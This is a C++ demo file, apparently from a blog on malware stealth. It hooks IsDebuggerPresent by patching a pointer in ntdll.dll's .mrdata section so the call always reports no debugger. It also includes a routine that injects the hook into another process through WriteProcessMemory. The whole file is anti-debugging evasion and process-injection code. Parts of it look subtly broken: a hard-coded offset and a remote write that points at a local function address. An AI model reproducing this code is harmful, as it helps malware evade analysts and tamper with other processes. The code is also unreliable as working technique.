
// mrdata_hook_demo.cpp
// Demonstrates hooking IsDebuggerPresent() via .mrdata section of ntdll.dll
// Author: Amit Chaudhary (GitHub Blog: Malware Stealth via .mrdata Hooking)

#include <windows.h>
#include <iostream>
#include <psapi.h>

// Fake IsDebuggerPresent function
extern "C" BOOL WINAPI FakeIsDebuggerPresent() {
    return FALSE; // Always lie
}

// Utility to find base address of ntdll.dll in current process
HMODULE GetNtdllBase() {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    HANDLE hProcess = GetCurrentProcess();

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            TCHAR szModName[MAX_PATH];
            if (GetModuleBaseName(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                if (_wcsicmp(szModName, L"ntdll.dll") == 0) {
                    return hMods[i];
                }
            }
        }
    }
    return nullptr;
}

// Remote injection: Injects a hook into target process via WriteProcessMemory (optional extension)
bool InjectMrdataHookRemote(DWORD pid, LPVOID hookFuncAddress, SIZE_T mrdataOffset) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "[-] Failed to open target process." << std::endl;
        return false;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), ntdll, &modInfo, sizeof(modInfo));

    LPVOID remoteMrdataAddr = (LPBYTE)modInfo.lpBaseOfDll + mrdataOffset;

    SIZE_T written;
    if (!WriteProcessMemory(hProc, remoteMrdataAddr, &hookFuncAddress, sizeof(LPVOID), &written)) {
        std::cerr << "[-] Failed to write to remote .mrdata" << std::endl;
        CloseHandle(hProc);
        return false;
    }

    std::cout << "[+] Remote .mrdata hook injected into PID " << pid << std::endl;
    CloseHandle(hProc);
    return true;
}

int main() {
    std::cout << "[+] Starting .mrdata hook demo...\n";

    HMODULE ntdllBase = GetNtdllBase();
    if (!ntdllBase) {
        std::cout << "[-] Failed to get ntdll.dll base address.\n";
        return -1;
    }

    // NOTE: Replace this offset with the actual address of IsDebuggerPresent pointer inside .mrdata.
    // You can get this from IDA by searching for a stub that loads ptr from .mrdata.
    const SIZE_T MRDATA_OFFSET = 0x1F42D0; // Example offset (may vary by Windows version)
    PVOID* mrdataPtr = (PVOID*)((BYTE*)ntdllBase + MRDATA_OFFSET);

    std::cout << "[+] Target .mrdata address: " << mrdataPtr << "\n";

    DWORD oldProtect;
    if (!VirtualProtect(mrdataPtr, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
        std::cout << "[-] Failed to change memory protection.\n";
        return -1;
    }

    *mrdataPtr = (PVOID)&FakeIsDebuggerPresent;
    VirtualProtect(mrdataPtr, sizeof(PVOID), oldProtect, &oldProtect);

    std::cout << "[+] .mrdata pointer successfully hooked!\n";

    // Call IsDebuggerPresent to test
    if (IsDebuggerPresent())
        std::cout << "[!] Debugger detected. (Should not happen!)\n";
    else
        std::cout << "[+] No debugger detected (Fake function was used).\n";

    return 0;
}
